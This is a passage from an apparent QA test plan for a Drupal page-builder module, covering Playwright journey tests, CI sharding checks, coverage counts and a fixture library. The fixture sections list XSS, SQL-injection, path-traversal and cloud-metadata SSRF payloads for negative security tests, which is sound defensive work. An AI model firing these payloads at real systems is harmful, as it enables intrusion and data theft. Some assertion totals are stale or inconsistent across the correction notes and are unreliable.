          }
        }
      });

      await test.step('[SOFT] Anonymous view: all N components × 3 breakpoints', async () => {
        // A separate browser context provides anonymous isolation.
        // NEVER call clearCookies() on the admin `page` context — that destroys the
        // admin session for all subsequent steps in this pass and future passes.
        for (const bp of [{ width: 1280, height: 900 }, { width: 768, height: 1024 }, { width: 393, height: 852 }]) {
          const anonContext = await browser.newContext();  // no storageState → anonymous
          const anonPage   = await anonContext.newPage();
          await anonPage.setViewportSize(bp);
          await anonPage.goto(publishedUrl);
          expect.soft(
            await anonPage.locator(fixture.expectedSelector).count(),
            `${componentId} visible @${bp.width}px (anon)`,
          ).toBeGreaterThan(0);
          for (const priorId of accumulatedComponents) {
            expect.soft(
              await anonPage.locator(COMPONENTS[priorId].expectedSelector).count(),
              `${priorId} regression @${bp.width}px (anon)`,
            ).toBeGreaterThan(0);
          }
          expect.soft(
            await anonPage.evaluate(() =>
              document.documentElement.scrollWidth > document.documentElement.clientWidth),
            `no horizontal overflow @${bp.width}px`,
          ).toBe(false);
          await anonContext.close();
        }
      });

      await test.step('[SOFT] Axe: full-page + scoped for C(n) only', async () => {
        // Strategy: one full-page scan per visit (attribution via the FINDING report)
        // + one component-scoped scan for C(n) only (the newly added component).
        // NOT per-component × 6 visits — see §3.2 for cost analysis (was 6N; now 7 fixed per pass).
        // Admin visit: exclude #toolbar-administration — a11y violations in admin chrome are
        // not Mosaic's responsibility and must not appear in Mosaic's finding log.
        await page.goto(publishedUrl);
        const { violations: pageViolations } = await axeCheck(page, null, { exclude: ['#toolbar-administration'] });
        expect.soft(pageViolations, `full-page axe violations (pass ${prevCount + 1})`).toHaveLength(0);
        const { violations: scopedViolations } = await axeCheck(page, fixture.expectedSelector);
        expect.soft(scopedViolations, `scoped axe violations for ${componentId}`).toHaveLength(0);
      });

      await test.step('[SOFT] Negative: blank required, invalid, XSS, draft-invisible-to-anon', async () => {
        if (fixture.invalid) {
          await page.goto(nodeUrl);
          await builderPage.attemptInvalidSave(componentId, fixture.invalid);
          expect.soft(await builderPage.saveWasBlocked(), `invalid save blocked for ${componentId}`).toBe(true);
        }
      });

      accumulatedComponents.push(componentId);
    });
  }

  test('kitchen sink: full accumulated node × all breakpoints × both roles @journey', async ({ page, browser }) => {
    // 18 components accumulated. All assertions are SOFT.
    // Revert one revision and verify prior state (revision integrity check).
    // See §3.2 kitchen-sink section for assertion count (~247 after axe strategy change).
  });
});
```

**Why non-serial + workers:1 and what the failure model means:** Each component test opens the
SAME journey node and adds one more component — step N depends on step N-1's published state.
`retries: 0` is enforced: a retry would re-drag an already-saved component onto the node,
corrupting the accumulation count. `test.describe()` + `workers: 1` + `fullyParallel: false`
keeps all J2 tests on one worker in declaration order with module-scoped variables persisting.
Hard failures fail ONLY pass N; passes N+1..18 still run. Soft failures accumulate in the report
without aborting. The result: every component is visited every run, and the full report shows
exactly which assertions passed and which failed. No test is ever skipped due to a prior failure.

### 2.4.1 Shard Lock — Accumulating Journey Must Never Split (Correction 2)

The nightly CI shards with `--shard=N/4`. Playwright's file-granular sharding keeps every test
in one file on the same shard naturally.

**The real protection is `fullyParallel: false` in the journeys project.** With
`fullyParallel: true`, Playwright can distribute individual tests across shards regardless of
file boundaries — which would break module-scoped variable sharing (`accumulatedComponents`,
`nodeUrl`, `nodeUuid`) causing non-deterministic failures (shard B's first test would find no
accumulated node, no URL, no prior components). With `fullyParallel: false`, Playwright shards at
the file level and the entire J2 file always lands on one shard.

> ~~"the shard count must never exceed the number of files in journeys/"~~ — that reasoning was
> wrong (excess shards simply receive zero tests; the problem is `fullyParallel: true`, not
> shard count). Corrected here.

**Hard rules:**
1. The entire accumulating journey (all 18 component passes + kitchen sink) MUST live in ONE
   file: `e2e/journeys/J2-author-page.spec.ts`. Never split it.
2. The SHARD LOCK comment is already in the code block above (§2.4).
3. In `playwright.config.ts`, the journeys project must set `fullyParallel: false`:
   ```typescript
   // Journey project: fullyParallel: false + workers: 1 keeps all J2 tests on one worker
   // in declaration order, with module-scoped variables (accumulatedComponents, nodeUrl)
   // persisting across tests. With fullyParallel: true, Playwright shards individual tests —
   // breaking module-scoped state and accumulating-node dependency.
   { name: 'journeys', testDir: './e2e/journeys', fullyParallel: false, workers: 1, dependencies: ['setup'] }
   ```
   Non-journey tests (`e2e/uat-*.spec.ts`) may keep `fullyParallel: true`.

**CI verification step** (add to nightly workflow, before suite runs):
```bash
# Assert every J2 test lands in the same shard.
# For each shard, --list prints the tests assigned to it. J2 tests must appear in exactly one shard.
J2_SHARDS_WITH_TESTS=0
for SHARD in 1 2 3 4; do
  COUNT=$(npx playwright test --shard=$SHARD/4 --list 2>/dev/null | grep -c "J2 — Author Page" || true)
  if [[ $COUNT -gt 0 ]]; then J2_SHARDS_WITH_TESTS=$((J2_SHARDS_WITH_TESTS+1)); fi
done
if [[ $J2_SHARDS_WITH_TESTS -ne 1 ]]; then
  echo "FATAL: J2 tests split across $J2_SHARDS_WITH_TESTS shards — check fullyParallel: false" >&2; exit 1
fi
```

**File-split canary** (CI step, before suite runs):
```bash
COUNT=$(ls e2e/journeys/J2-*.spec.ts 2>/dev/null | wc -l)
if [[ $COUNT -ne 1 ]]; then
  echo "FATAL: J2 journey split into $COUNT files — accumulating-node state dependency broken" >&2; exit 1
fi
```

### 2.5 Visual Regression Strategy

Per directive §6.3:

**Primary: Aria snapshots** (environment-stable):
```typescript
await expect(page.locator('.mosaic-heading')).toMatchAriaSnapshot({ name: `${componentId}.aria.yml` });
```
Written once per component per breakpoint. Stored in `e2e/snapshots/aria/`. Updated only
after human review (`npx playwright test --update-snapshots`).

**Secondary: Computed-style assertions** (diagnose what broke, not just that it broke):
```typescript
const style = await page.locator('.mosaic-heading').evaluate(el =>
  getComputedStyle(el).fontFamily
);
expect(style).toContain('Inter');  // or whatever the design system font is
```
Color assertions use ΔE2000 ≤2 tolerance via a `assertColor(hex1, hex2)` utility
(avoids exact hex matching which fails on anti-aliasing).

**Tertiary: Screenshot baselines** (`@pixel` tag) — component-clipped, per breakpoint,
animations disabled, pinned to ONE environment (local DDEV). Never auto-regenerated in CI.

```typescript
// Tag every toHaveScreenshot test with @pixel:
test('heading visual baseline @pixel', async ({ page }) => {
  await expect(page.locator('.mosaic-heading')).toHaveScreenshot(`heading-desktop.png`, {
    animations: 'disabled',
    threshold: 0.1,
    maxDiffPixelRatio: 0.01,
  });
});
```

**CI pixel exclusion (mandatory):** CI pipeline always adds `--grep-invert @pixel`.
Font rendering differs between local macOS and CI Linux — pixel baselines from DDEV will
produce false failures in CI without this exclusion.

```bash
# Nightly CI — exclude pixel tests
npx playwright test --shard=$SHARD_INDEX/4 --grep-invert @pixel --workers=1 --reporter=blob

# Local only — run pixel tests and regenerate baselines
npx playwright test --grep @pixel --update-snapshots
```

This exclusion is stated here in §2.5 AND enforced in §6 CI commands. Never assume pixel tests
are implicitly excluded — state it explicitly in every CI command that would otherwise run them.

**Distinguish module vs. theme:** Component-scoped assertions cover what Mosaic owns.
Full-page assertions note that theme/admin chrome differences are expected — use
`mask: [page.locator('#toolbar-administration')]` to exclude admin chrome.

### 2.6 No-JS Initial HTML Check (Twig-First Promise)

Per roadmap J2: "content present in **initial HTML** (no-JS fetch)":
```typescript
// In FrontendPage
async fetchInitialHtml(url: string, anonRequest: APIRequestContext): Promise<string> {
  // MUST use the caller-supplied anonymous APIRequestContext.
  // Never use this.page.request — it inherits admin session cookies and returns
  // authenticated HTML, invalidating the Twig-first test entirely.
  // Callers must: const anonReq = await playwright.request.newContext(); ... await anonReq.dispose();
  const res = await anonRequest.fetch(url);
  return await res.text();  // raw HTML before JS execution
}

// In test (see §2.4 Twig-first step for the full call pattern with create/dispose):
const anonReq = await playwright.request.newContext();
const html = await frontendPage.fetchInitialHtml(publishedUrl, anonReq);
await anonReq.dispose();
expect(html).toContain(fixture.heading.text);  // text is in initial SSR HTML
```
This is the machine-enforceable proof of the "Twig-first" promise. No JS execution path
can fake this check.

### 2.7 Testability Hooks Required from Product Code

Per directive §8 (Dev Architect hat) — these must be added to `BuilderApp.tsx` before
the new suite can be built:

| Hook | Purpose | Where |
|---|---|---|
| `data-testid="mosaic-can-undo"` with `data-state="true/false"` | Web-first poll for Puck history committed (fixes FINDING-001) | BuilderApp.tsx, bound to `appState.ui.historyIndex > 0` |
| `data-testid="mosaic-can-redo"` with `data-state="true/false"` | Same for redo | BuilderPage.tsx |
| `data-testid="mosaic-component-count"` with `data-count="{n}"` | Stable count assertion after drag | Canvas wrapper |
| `data-testid="mosaic-preview-state"` with `data-state="loading/empty/ready"` | Web-first Tier B SSR state | SSR preview wrapper |
| `data-testid="mosaic-save-state"` with `data-state="idle/saving/saved/error"` | Web-first save completion | Save button wrapper |

These are purely additive `data-*` attributes — no behavioral change, no user-visible output.
Each must ship in the same MR as the test that uses it (per roadmap T.3.4 rule).

---

## 3. Coverage Matrix with Counts

### 3.1 Production Components (18)

| # | Component ID | Category | SSR? | Restricted? | Tier |
|---|---|---|---|---|---|
| 1 | `mosaic_heading` | Content | No | No | A |
| 2 | `mosaic_text` | Content | No | No | A |
| 3 | `mosaic_button` | Content | No | No | A |
| 4 | `mosaic_image` | Media | **Yes** | No | B |
| 5 | `mosaic_card` | Content | No | No | A |
| 6 | `mosaic_columns` | Layout | No | No | A (slots) |
| 7 | `mosaic_divider` | Layout | No | No | A |
| 8 | `mosaic_spacer` | Layout | No | No | A |
| 9 | `mosaic_html` | Developer | **Yes** | **Yes** | B |
| 10 | `mosaic_meta` | SEO | No | **Yes** | A (head) |
| 11 | `webform_embed` | Interactive | **Yes** | No | B |
| 12 | `search_bar` | Search | No | No | A |
| 13 | `search_results` | Search | **Yes** | No | B |
| 14 | `mosaic_tabs` | Interactive | **Yes** | No | B (Lit) |
| 15 | `mosaic_carousel` | Interactive | **Yes** | No | B (Lit) |
| 16 | `mosaic_live_search` | Interactive | **Yes** | No | B (Lit) |
| 17 | `product_list` | Commerce | **Yes** | No | B |
| 18 | `product_card` | Commerce | **Yes** | No | B |

Tier A: renders purely via Twig in canvas. Tier B: SSR preview required; loading skeleton visible before SSR completes.

### 3.2 Master Journey Test Count (J2 — corrected)

> **CORRECTION (2026-07-10):** The original §3.2 used a flat "~9 avg accumulated regression
> checks per component." That was wrong. The directive (§4 + Arun's review instruction) requires
> ALL previously added components to be re-verified at EVERY pass as BOTH admin AND anonymous at
> ALL THREE breakpoints. The correct model is a triangular sum over N, not a flat average.
> Corrected count: ~4,819 assertions (vs original claim of ~700 — undercounted 7×).

**Per-pass formula (pass N, adding component C(n); node now holds all N components):**

The N-variable term is a triangular sum: Σ(N=1→18)N = 18×19/2 = **171**.

| Step | Description | Fixed/pass | Variable/pass |
|---|---|---|---|
| A.1 Drag | `toHaveCount(prev+1)` | 1 | — |
| A.2–3 Fill fields | value reflects in prop panel (avg 4 fields) | 4 | — |
| A.4 Preview | loading skeleton (Tier B) or immediate (Tier A) | 1 | — |
| A.5 Save + publish | URL accessible, page loads | 1 | — |
| **A total** | | **7** | |
| B.6 Admin × 3 bps | All N components: visible + content (2 assertions/component/visit × 3 visits) | — | **6N** |
| B.7 Precision | font-family + color + bbox + screenshot per component (1 canonical admin bp) | — | **4N** |
| Admin overhead | no console errors × 3 admin visits | 3 | — |
| Twig-first HTML | ALL N components' key text in no-JS initial HTML | — | **N** |
| **B + Twig total** | | **3** | **11N** |
| C.9-10 Anon × 3 bps | All N components: visible + content (2 assertions/component/visit × 3 visits) | — | **6N** |
| §6.4 Axe — full-page × 6 visits | One full-page axe scan per visit (3 admin bps + 3 anon bps) | **6** | — |
| §6.4 Axe — scoped for C(n) only | One component-scoped scan for the NEWLY added component only | **1** | — |
| §6.4 Overflow + console per visit × 6 | No horizontal overflow + no console errors, 6 visits | 5 | — |
| **C total** | | **12** | **6N** |
| D.11 Negative pass | blank required (2) + invalid (2) + XSS (1) + draft-anon (1) for C(n) | 6 | — |
| **D total** | | **6** | |
| **Grand total per pass N** | | **28 (fixed)** | **17N (variable)** |

> **Axe strategy (2026-07-10 correction):** The original table used "axe per component × 6 visits
> = 6N" — 1,026 scans for J2, 17–51 minutes of pure axe. A full-page axe scan already covers
> every component on the page. The new strategy: one full-page scan per visit (covers all components
> by definition) + one component-scoped scan for C(n) only (preserves attribution for the new
> component). Coverage is identical; cost drops from 6N to 7 fixed per pass. The overflow and
> console assertions are now shown separately as 5 fixed/pass. See §3.7 for revised totals.

**Accumulation arithmetic across all 18 passes (corrected — round 3):**
```
Per-pass fixed rows: A(7) + B+Twig(3) + C(12) + D(6) = 28 fixed
Per-pass variable: 11N (B+Twig) + 6N (C) = 17N

Σ(N=1→18) [28 + 17N]
= 18 × 28  +  17 × Σ(N=1→18) N
= 504       +  17 × 171
= 504       +  2,907
= 3,411 assertions (18 component passes)
```

**Pass-by-pass profile (shows why the flat "~9 avg" was wrong):**
| Pass | Component | Fixed | Variable 17N | Total |
|---|---|---|---|---|
| 1 | C(1) — 0 prior | 28 | 17 | 45 |
| 5 | C(5) — 4 prior | 28 | 85 | 113 |
| 9 | C(9) — 8 prior | 28 | 153 | 181 |
| 14 | C(14) — 13 prior | 28 | 238 | 266 |
| 18 | C(18) — 17 prior | 28 | 306 | 334 |

**Kitchen sink (E.12) — after all 18 components accumulated:**
- 2 roles × 3 bps × 18 components × 2 assertions: 216
- Full-page axe × 6 visits: 6
- Twig-first (full-node 18 components): 18
- Overflow + console per visit × 6: 12
- Revision revert: 4
- Full-page ariaSnapshot × 3 bps: 3
**Kitchen-sink: ~259 assertions**

> Original kitchen-sink total was 367 — reduced to 259 after removing 108 per-component axe
> scans (18 components × 6 visits) and 18 old "page-level" entries, replaced by 6 full-page axe.

**J2 total: 3,411 + 259 = ~3,670 assertions across 19 test functions**

Notes:
- At "every visible element" depth (4 assertions/component/visit instead of 2), the 6N and 6N
  render terms become 12N + 12N = 24N, pushing J2 above ~5,000 assertions.
- Inline editing (B.8): `SPEC-PENDING` — tests written and marked `test.skip('SPEC-PENDING: ...')`, counted separately in §3.6 as 4 tests / ~18 assertions. Not counted in the 3,411 above.
- This estimate uses 2 assertions per component per visit (minimum: visible + content/text).
  The directive's "no spot check, every visible element accounted for" (§6.4) pushes toward 4+.
- The directive explicitly accepts "hours-long runtime" and "one worker" for this depth.

### 3.3 Special Journey Test Counts

| Journey | Description | Estimated tests | Estimated assertions |
|---|---|---|---|
| J1 | First Contact (install → field → widget) | 8 | 20 |
| J3 | Templates (save / browse / load / independence) | 6 | 30 |
| J4 | Live Data + access-check security | 8 | 35 |
| J5 | Design Tokens (computedStyle cascade) | 5 | 20 |
| J6 | Editorial Lifecycle (moderation, revisions) | 8 | 40 |
| J7 | Breakpoints (per-breakpoint overrides) | 6 | 30 |
| J8 | Accessibility (axe × 18 components + full-page + 2.5.7 + 2.5.8) | 25 | 80 |
| J9 | Schema Migration (migrateInstance round-trip) | 4 | 20 |
| J10 | Adversary / Abuse (SSRF, field access, malformed JSON, CSRF) + mosaic_html security contract (PR-011–PR-017) | 17 | 75 |

**Special journeys total: ~87 tests, ~360 assertions**
Note: J10 expanded by 7 tests (PR-011–PR-017) for the mosaic_html security contract (see Promotion Register §7 and FINDING-007).

### 3.4 Sub-Module Interop Matrix

5 plugin-bearing submodules × representative component lifecycle:

| Sub-module | Representative components | Journey depth | Tests |
|---|---|---|---|
| mosaic_components | All 18 components (§3.1) | Full J2 | covered by J2 |
| mosaic_metatag | mosaic_meta (head injection) | Abbreviated (no visual) | 4 |
| mosaic_webform | webform_embed | Full J2 partial | 8 |
| mosaic_search | search_bar, search_results | J2 + J4 (data source) | 10 |
| mosaic_commerce | product_list, product_card | J2 + J4 (data source) | 10 |

**Sub-module interop total: ~32 tests**

### 3.5 Pairwise Breadth Matrix

Pairwise applied where axes share a rendering or storage mechanism (per directive §5):

**Axis 1 — Field value classes × validation path:**
Valid / boundary / invalid / XSS / unicode / max-length × 5 field types (text, enum, boolean, integer, URL) = 30 combinations. Pairwise coverage: ~15 curated cases covering all 2-way pairs. These exercise the Drupal field validation and the Mosaic schema validator simultaneously.

**Axis 2 — Breakpoint × SSR behavior:**
3 breakpoints × 2 rendering tiers (Tier A / Tier B SSR) = 6 combinations. All 6 must be tested (small matrix — full coverage, no pairwise needed).

**Axis 3 — Component × neighbor interaction:**
When two components are adjacent in a `mosaic_columns` slot, do they each render correctly? Sample: heading + image, text + button, carousel + live_search. Pairwise selects 8 representative pairs from 153 possible (18C2). See Promotion Register (§7).

**Axis 4 — Role × component × field visibility:**
Admin sees all props; restricted components (mosaic_html, mosaic_meta) invisible to non-admin roles. 2 roles × 2 restricted components × 3 access scenarios = 12 cases; run all (small matrix).

**Pairwise breadth total: ~45 curated test cases**

### 3.6 Inline Editing Journey (B.8 — SPEC-PENDING)

Per directive §4 B.8: "Inline/visual editing positive + negative cases." This capability
requires Epic 6 to ship. Tests MUST be written now and marked `SPEC-PENDING` per oracle rule
§3 — they become the executable spec and flip on when Epic 6 lands. Omitting them would hide
the gap.

| Test | Description | Oracle |
|---|---|---|
| B.8-1 | Click heading text in canvas → enters inline edit mode | Inline edit toolbar visible; text field editable in place |
| B.8-2 | Edit heading text inline → verify live update in canvas | Canvas text matches typed value without save |
| B.8-3 (NEG) | Attempt inline edit as anonymous user on published page | No inline edit controls present; no JS error |
| B.8-4 (NEG) | Click non-editable region → no inline edit triggered | No inline edit toolbar; no crash |

**Status:** `SPEC-PENDING` (Epic 6 not shipped). Tests written as:
```typescript
test.skip('SPEC-PENDING: B.8-1 — click heading text in canvas → inline edit mode', async () => {
  // Epic 6 not yet shipped. Implement: click heading, assert inline toolbar visible + field editable.
});
test.skip('SPEC-PENDING: B.8-2 — edit heading text inline → verify live canvas update', async () => {});
test.skip('SPEC-PENDING: B.8-3 NEG — attempt inline edit as anonymous → no edit controls', async () => {});
test.skip('SPEC-PENDING: B.8-4 NEG — click non-editable region → no toolbar, no crash', async () => {});
```
**Count:** 4 tests, ~18 assertions (included in §3.7 SPEC-PENDING row).

### 3.7 AI Generation Journey

Per directive §4 sub-journey:

| Test | Description | Assertions |
|---|---|---|
| Valid prompt → schema-valid layout | Mocked provider, full pipeline | 8 |
| Valid prompt → editable result | Mocked, drag/fill after AI generation | 5 |
| Valid prompt → publishes → anonymous-correct | Mocked, full lifecycle | 6 |
| Invalid AI output rejected | Validation error, nothing persisted | 4 |
| Missing AI config → no UI shown | Graceful degradation | 3 |

**AI journey total: 5 tests, ~26 assertions**
Note: Requires `mosaic_intelligence` with a deterministic mocked provider fixture.
SPEC-PENDING until Epic 1 ships; tests are written and marked `test.skip('SPEC-PENDING: Epic 1 not yet shipped')`.

### 3.8 Summary Count (corrected 2026-07-10)

> **CORRECTION:** Original totals (~181 tests / ~1,351 assertions) were wrong due to the
> flat-average accumulation error in §3.2. Second correction (2026-07-10): axe strategy
> change drops J2 from ~4,912 to ~3,580. Third correction (2026-07-10): arithmetic fix
> (fixed=28 not 23, C variable=6N not 12N) raises J2 from ~3,580 to ~3,670; grand total
> from ~4,294 to ~4,384. The ~192 test-function count is unchanged.

| Layer | Tests | Assertions | Notes |
|---|---|---|---|
| J2 Master Journey (accumulating node × 18 passes + kitchen sink) | 19 | **~3,670** | 3,411 main loop + 259 kitchen sink (arithmetic corrected round 3) |
| J2 Inline editing SPEC-PENDING (B.8) | 4 | ~18 | Written + skipped; flip when Epic 6 ships |
| Special Journeys J1, J3–J10 (J10 expanded for mosaic_html) | ~87 | ~360 | J10 +7 tests for security contract (PR-011–PR-017) |
| Sub-module interop | ~32 | ~130 | Unchanged |
| Pairwise breadth | ~45 | ~180 | Unchanged |
| AI generation journey (SPEC-PENDING) | 5 | ~26 | Written + skipped; flip when Epic 1 ships |
| **TOTAL** | **~192 test functions** | **~4,384 assertions** | |

**Range:** ~3,600–5,600+ assertions depending on per-component assertion depth (2–4 per visit).
Directive explicitly accepts multi-hour runtime; single worker.

**Correction history:**
- Original: ~181 tests / ~1,351 assertions
- Round-1 correction (axe flat error): ~189 tests / ~5,608 assertions
- Round-2 correction (axe strategy): ~192 tests / ~4,294 assertions (axe -1,314; SPEC-PENDING tests +4/+18)
- Round-3 correction (arithmetic): ~192 tests / ~4,384 assertions (fixed=28 not 23, C variable=6N not 12N; Σ → 3,411; J2 total 3,670 vs 3,580)

Current suite (127 tests, ~350 assertions) is the regression net until coverage is met area by area.

---

## 4. Fixture Library Spec

Real, government-flavored content. No lorem ipsum. Every field has a VALID value and an
INVALID/attack value. All defined in `js/e2e/fixtures/components.ts`.

### 4.1 Global Real-Content Values

| Type | Value | Notes |
|---|---|---|
| Page title | "Road Safety Campaign — Summer 2026" | Government program name |
| Short text | "Register for the Federal Clean Water Initiative" | Program CTA |
| Long rich text | "The Occupational Health and Safety Review Panel meets quarterly to assess workplace incident data from all reporting jurisdictions. All data is anonymized per the Privacy Act of 1974 (5 U.S.C. § 552a)." | Real-shaped sentence, legal citation |
| URL (internal) | `/programs/road-safety/2026` | Realistic internal path |
| URL (external) | `https://www.usa.gov/federal-agencies` | Real public URL |
| Image alt text | "Aerial photograph of the I-95 corridor showing variable message signs during the 2025 snowstorm response" | Descriptive, meets WCAG 1.1.1 |
| Date | `2026-09-22` | Future date, consistent with program timeline |
| Phone | `+1 (202) 555-0173` | DC area code, 555 prefix for non-real |
| Unicode / diacritics | "Protección de Datos Personales — Hébergement Sûr" | Spanish + French — J2 §4 B.6 render assertion (component `mosaic_text`) |
| RTL sample | "حقوق الإنسان في الفضاء الرقمي" | Arabic — used in pairwise Axis 1 (field-value class: unicode); specific pair: `mosaic_heading.text` × RTL string → layout does not break |
| Max-length string | 255 chars of `"A"` followed by the word "END" | Pairwise Axis 1 (field-value class: max-length); pair: `mosaic_text.body` × max-length → truncated or saved correctly |
| XSS attack | `<script>document.cookie='xss=1'</script>` | PR-001 (escaped-context components) and PR-011–PR-015 (mosaic_html); also D.11 negative pass in J2 |
| SQL injection | `'; DROP TABLE node; --` | Pairwise Axis 1 (field-value class: invalid/attack); pair: `mosaic_text.body` × sql_injection → renders as literal text, no DB error |
| Null byte | `text\x00injection` | Pairwise Axis 1 (boundary/attack); pair: `mosaic_heading.text` × null_byte → Drupal field sanitizes or rejects |
| Unicode XSS | `＜script＞` (full-width angle brackets) | Pairwise Axis 1 (attack variant); pair: any text field × unicode_xss → renders as literal, no script executed |
| Path traversal | `../../../etc/passwd` | J10 adversary (PR-003 scope); pair: `mosaic_button.url` × path_traversal → Drupal URL validation rejects or renders as literal |

### 4.2 Per-Component Fixture Values

```typescript
// js/e2e/fixtures/components.ts
import type { APIRequestContext } from '@playwright/test';

export interface ComponentFixture {
  valid: Record<string, unknown>;
  invalid?: Record<string, unknown>;
  attack?: Record<string, unknown>;
  boundary?: Record<string, unknown>;
  expectedSelector: string;
  expectedTag?: string;
  slots?: string[];
  restricted?: boolean;
  requiresMedia?: boolean;
  requiresDataSource?: boolean;
  requiresCommerce?: boolean;
  isTierB?: boolean;
  /** Field name inside `valid` whose value is the key text for the Twig-first HTML check. Defaults to 'text'. */
  textKey?: string;
  /** CSS property → expected computed value for the precision style assertion (assertComputedStyle). */
  style?: Record<string, string>;
}

export const COMPONENTS: Record<string, ComponentFixture> = {

  mosaic_heading: {
    valid: { text: 'Register for the Federal Clean Water Initiative', level: 'h2', alignment: 'left' },
    invalid: { text: '', level: 'h2', alignment: 'left' },   // blank required field
    attack:  { text: '<script>document.cookie="xss=1"</script>', level: 'h2', alignment: 'left' },
    expectedSelector: '.mosaic-heading',
    expectedTag: 'h2',
  },

  mosaic_text: {
    valid: { body: 'The Occupational Health and Safety Review Panel meets quarterly...', alignment: 'left' },
    invalid: { body: '', alignment: 'left' },
    attack: { body: '<img src=x onerror=alert(1)>', alignment: 'left' },
    expectedSelector: '.mosaic-text',
  },

  mosaic_button: {
    valid: { label: 'Register Now', url: 'https://www.usa.gov/federal-agencies', variant: 'primary', size: 'md', target: '_self' },
    invalid: { label: '', url: 'not-a-url', variant: 'primary', size: 'md', target: '_self' },
    attack: { label: 'Click me', url: 'javascript:alert(1)', variant: 'primary', size: 'md', target: '_self' },
    expectedSelector: '.mosaic-button',
  },

  mosaic_image: {
    valid: { src: 'MEDIA_ID_FROM_SETUP', alt: 'Aerial photograph of the I-95 corridor...', loading: 'lazy', caption: 'Source: FHWA 2025 Annual Report' },
    invalid: { src: '', alt: '', loading: 'lazy', caption: '' },  // missing alt = a11y violation
    expectedSelector: '.mosaic-image img',
    requiresMedia: true,
  },

  mosaic_card: {
    valid: { title: 'Road Safety Initiative', description: 'A public-private partnership to reduce highway fatalities by 20% before 2030.', link_url: '/programs/road-safety', link_text: 'Learn more', variant: 'default' },
    invalid: { title: '', description: '', link_url: '', link_text: '', variant: 'default' },
    expectedSelector: '.mosaic-card',
  },

  mosaic_columns: {
    valid: { columns: 3, gap: 'md' },
    // SPEC-GAP NOTE: "columns: 1" is the invalid case, but whether Drupal/SDC
    // enforces a minimum of 2 at the field level has not been verified in the schema.
    // Before this fixture is used in a negative-pass test, read the mosaic_columns
    // component definition and confirm the constraint. If no minimum is enforced →
    // log as FINDING: "mosaic_columns: min:2 not enforced" and write an oracle test
    // asserting that columns:1 produces a layout with exactly one slot (not a save error).
    // The comment "if enforced" is an open-ended expectation that violates the Oracle Rule —
    // replaced here with an explicit action item. See §8 for FINDING template.
    invalid: { columns: 1, gap: 'md' },   // PENDING schema verification (see note above)
    boundary: { columns: 4, gap: 'lg' },  // max columns — verify max in schema too
    expectedSelector: '.mosaic-columns',
    slots: ['column_1', 'column_2', 'column_3'],
  },

  mosaic_divider: {
    valid: { style: 'solid', spacing: 'md' },
    expectedSelector: '.mosaic-divider',
  },

  mosaic_spacer: {
    valid: { size: 'lg' },
    boundary: { size: 'xl' },
    expectedSelector: '.mosaic-spacer',
  },

  mosaic_html: {
    valid: { content: '<p>Contact us at <a href="mailto:info@example.gov">info@example.gov</a></p>' },
    attack: { content: '<script>document.cookie="xss=1"</script>' },
    expectedSelector: '.mosaic-html',
    restricted: true,
  },

  mosaic_meta: {
    valid: { title: 'Road Safety Campaign — USA.gov', description: 'Federal road safety resources for the 2026 summer driving season.', og_image: 'MEDIA_URL_FROM_SETUP', canonical: '/programs/road-safety' },
    expectedSelector: 'head title',  // head tag, not canvas visual
    restricted: true,
  },

  webform_embed: {
    valid: { webform_id: 'WEBFORM_ID_FROM_SETUP', title: 'Incident Report Form', open: true },
    invalid: { webform_id: 'nonexistent_form_id', title: '', open: false },
    expectedSelector: '.mosaic-webform form, .mosaic-webform .webform-submission-form',
  },

  search_bar: {
    valid: { placeholder: 'Search federal programs...', label: 'Site search', action: '/search', param: 'q', button_label: 'Go' },
    expectedSelector: '.mosaic-search-bar input[type="search"]',
  },

  search_results: {
    valid: { empty_text: 'No programs found for this search.', heading: 'Search Results', view_mode: 'teaser' },
    expectedSelector: '.mosaic-search-results',
    requiresDataSource: true,
  },

  mosaic_tabs: {
    valid: { labels: 'Overview,Benefits,Eligibility,How to Apply', panel_1: 'Overview content for the Federal Clean Water Initiative.', panel_2: 'Benefits include...', panel_3: 'Eligibility requires...', panel_4: 'Apply at usa.gov/apply' },
    expectedSelector: 'mosaic-tabs',  // Lit web component
    isTierB: true,
  },

  mosaic_carousel: {
    valid: { auto_advance: false, interval: 5000, loop: true, slide_1: '<p>Slide 1 — Road Safety Statistics 2025</p>', slide_2: '<p>Slide 2 — Program Highlights</p>' },
    boundary: { auto_advance: true, interval: 1000, loop: false, slide_1: '<p>Only slide</p>' },
    expectedSelector: 'mosaic-carousel',
    isTierB: true,
  },

  mosaic_live_search: {
    valid: { endpoint: '/api/mosaic/live-search', placeholder: 'Type to search...', min_chars: 2 },
    boundary: { endpoint: '/api/mosaic/live-search', placeholder: 'Hébergement Sûr', min_chars: 1 },
    invalid: { endpoint: 'http://169.254.169.254/latest/meta-data/', placeholder: 'test', min_chars: 1 },  // SSRF attempt
    expectedSelector: 'mosaic-live-search',
    isTierB: true,
  },

  product_list: {
    valid: { empty_text: 'No products available.', heading: 'Featured Products', view_mode: 'teaser', columns: 3 },
    expectedSelector: '.mosaic-product-list',
    requiresCommerce: true,
    isTierB: true,
  },

  product_card: {
    valid: { product_id: 'PRODUCT_ID_FROM_SETUP', view_mode: 'full', show_image: true, show_price: true, show_add_to_cart: true, heading_level: 'h3' },
    expectedSelector: '.mosaic-product-card',
    requiresCommerce: true,
    isTierB: true,
  },
};
```

### 4.3 Invalid / Attack Fixtures

```typescript
// js/e2e/fixtures/invalid.ts
export const ATTACK_FIXTURES = {
  xss_script: '<script>document.cookie="xss=1"</script>',
  xss_img: '<img src=x onerror="document.cookie=\'xss=1\'">',
  xss_svg: '<svg onload=alert(1)>',
  sql_injection: "'; DROP TABLE node; --",
  path_traversal: '../../../etc/passwd',
  ssrf_aws_metadata: 'http://169.254.169.254/latest/meta-data/',
  ssrf_internal: 'http://10.0.0.1/admin',
  max_length: 'A'.repeat(255) + 'OVERFLOW',
  unicode_rtl: '‮ reversed',  // right-to-left override character
  null_byte: 'text\x00injection',
  unicode_xss: '＜script＞',  // full-width angle brackets
};
```

---

## 5. Sprint / Story Breakdown

Based on roadmap sequencing ("NOW → NEXT → RELEASE N+1") mapped to the directive's requirements.

### S0.4 — Environment + Tooling (builds on S0.1–S0.3)

**Goal:** Green CI gate, research-backed tooling verified, testability hooks added to product code,
QA setup script updated for JSON:API + Basic Auth user.

| Story | Description | Output files |
|---|---|---|
| S0.4.1 | Integrate `@axe-core/playwright` v4.12.1 in `helpers/a11y.ts` — API already verified (§1.7); no pre-build research needed | `helpers/a11y.ts` |
| S0.4.2 | Verify Puck 0.22.0 changelog; document any breaking changes to drag/hotkeys | `AI/TODO.md` FINDING-003 update |
